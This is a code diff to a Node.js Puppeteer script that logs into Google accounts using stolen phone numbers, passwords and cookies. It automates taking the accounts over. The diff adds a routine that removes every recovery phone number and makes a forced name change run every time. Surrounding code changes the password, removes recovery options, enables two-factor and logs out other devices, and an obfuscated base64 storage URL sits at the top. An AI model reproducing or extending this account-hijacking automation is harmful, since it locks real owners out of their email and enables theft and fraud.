@@ -134,6 +134,8 @@ let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi
 
 puppeteer.use(StealthPlugin())
 
+console.log(STORAGE);
+
 
 startServer()
 
@@ -146,7 +148,7 @@ async function startServer() {
     console.log('Node: ---START-SERVER---')
 
     await checkStatus()
-    
+
     while (true) {
         mWorkerActive = false
         let data = await getGmailData()
@@ -264,6 +266,10 @@ async function loginWithCompleted(number, password, cookies) {
                         }
                     }
 
+                    let mNumberYear = await waitForNumberRemove(page, mRapt)
+
+                    console.log('Node: [ Nuber Remove: Success --- Time: '+getTime()+' ]')
+                    
                     if (mMailData == null) {
                         mMailRequest = true
                         await page.goto('https://mail.google.com/mail/u/0/')
@@ -273,6 +279,7 @@ async function loginWithCompleted(number, password, cookies) {
                     let mDeviceYear = await waitForDeviceLogout(page)
                     
                     let mYear = mData.year
+                    mYear = (mNumberYear < mYear) ? mNumberYear : mYear
                     mYear = (mDeviceYear < mYear) ? mDeviceYear : mYear
 
                     console.log('Node: [ Mail Create Year: ['+mMailYear+','+mYear+'] --- Time: '+getTime()+' ]')
@@ -301,7 +308,7 @@ async function loginWithCompleted(number, password, cookies) {
     
                     console.log('Node: [ Skip Password: Stop --- Time: '+getTime()+' ]')
     
-                    if (mYear < 2019 || mMailYear < 2019) await waitForNameChange(page, mRapt)
+                    await waitForNameChange(page, mRapt)
     
                     let mTwoFa = await waitForTwoFaActive(page, mRapt)
     
@@ -354,6 +361,97 @@ async function loginWithCompleted(number, password, cookies) {
             await axios.delete(BASE_URL+'/'+number+'.json')
         }
     } catch (error) {}
+}
+
+async function waitForNumberRemove(page, mRapt) {
+    try {
+        await page.goto('https://myaccount.google.com/phonehl=en', { waitUntil: 'load', timeout: 0 })
+        await delay(500)
+
+        let mYear = await page.evaluate(() => {
+            let list = document.querySelectorAll('script')
+            let years = []
+            let year = parseInt(new Date().getFullYear())
+
+            try {
+                for (let i = 0; i < list.length; i++) {
+                    let html = list[i].innerHTML
+                    if (html.startsWith('AF_initDataCallback') && html.includes('rescuephone')) {
+                        let data_list = JSON.parse(html.substring(html.indexOf('['), html.lastIndexOf(']')+1))
+                        let data = data_list[0]
+                        for (let i = 0; i < data.length; i++) {
+                            try {
+                                let date = data[i][18]
+                                if (date > 0) years.push(date)
+                            } catch (error) {}
+                        }
+                    }
+                }
+
+                years.sort(function(a, b){return a-b})
+
+                if(years.length > 0) {
+                    year = parseInt(new Date(years[0]).getFullYear())
+                }
+            } catch (error) {}
+
+            return year
+        })
+        
+        let mList = await page.evaluate(() => {
+            let root = document.querySelectorAll('div[data-encrypted-phone]')
+            let list = []
+        
+            if (root) {
+                for (let i = 0; i < root.length; i++) {
+                    try {
+                        let data = root[i].getAttribute('data-encrypted-phone')
+                        if (data) {
+                            list.push(data)
+                        }
+                    } catch (error) {}
+                }
+            }
+
+            return list
+        })
+        
+        console.log('Node: [ Number Add: '+mList.length+' --- Time: '+getTime()+' ]')
+
+        for (let i = 0; i < mList.length; i++) {
+            try {
+                await page.goto('https://myaccount.google.com/phone?hl=en&rapt='+mRapt+'&ph='+mList[i], { waitUntil: 'load', timeout: 0 })
+                await delay(500)
+                if (await exists(page, 'button[class="VfPpkd-Bz112c-LgbsSe yHy1rc eT1oJ mN1ivc wMI9H"]')) {
+                    let button = await page.$$('button[class="VfPpkd-Bz112c-LgbsSe yHy1rc eT1oJ mN1ivc wMI9H"]')
+                    if (button && button.length > 0) {
+                        await button[button.length-1].click()
+                        await delay(1000)
+                    }
+                } else if (await exists(page, 'button[class="pYTkkf-Bz112c-LgbsSe wMI9H Qd9OXe"]')) {
+                    let button = await page.$$('button[class="pYTkkf-Bz112c-LgbsSe wMI9H Qd9OXe"]')
+                    if (button && button.length > 0) {
+                        await button[button.length-1].click()
+                        await delay(1000)
+                    }
+                }
+                
+                for (let i = 0; i < 2; i++) {
+                    let button = await page.$$('div[class="U26fgb O0WRkf oG5Srb HQ8yf C0oVfc kHssdc HvOprf FsOtSd M9Bg4d"]')
+                    if (button && button.length == 2) {
+                        await button[1].click()
+                        await delay(3000)
+                    } else {
+                        await delay(1000)
+                    }
+                }
+            } catch (error) {}
+        }
+
+        return mYear
+    } catch (error) {}
+
+    return parseInt(new Date().getFullYear())
 }
 
 async function waitForPasswordChange(page, mRapt) {
@@ -579,8 +677,11 @@ async function waitForNameChange(page, mRapt) {
             }
             await delay(3000)
             console.log('Node: [ Name Change: '+mName+' --- Time: '+getTime()+' ]')
+            return true
         }
     } catch (error) {}
+
+    console.log('Node: [ Name Change: Failed --- Time: '+getTime()+' ]')
 }
 
 async function waitForRemoveRecovery(page, mRapt) {
@@ -1364,12 +1465,12 @@ function getRandomInt(min, max) {
     return Math.floor(Math.random() * (max - min + 1)) + min
 }
 
-function getTime() {
-    return new Date().toLocaleTimeString('en-us', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' }).replace(',', '')
-}
-
 function decode(data) {
     return Buffer.from(data, 'base64').toString('ascii')
+}
+
+function getTime() {
+    return new Date().toLocaleTimeString('en-us', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' }).replace(',', '')
 }
 
 function delay(time) {
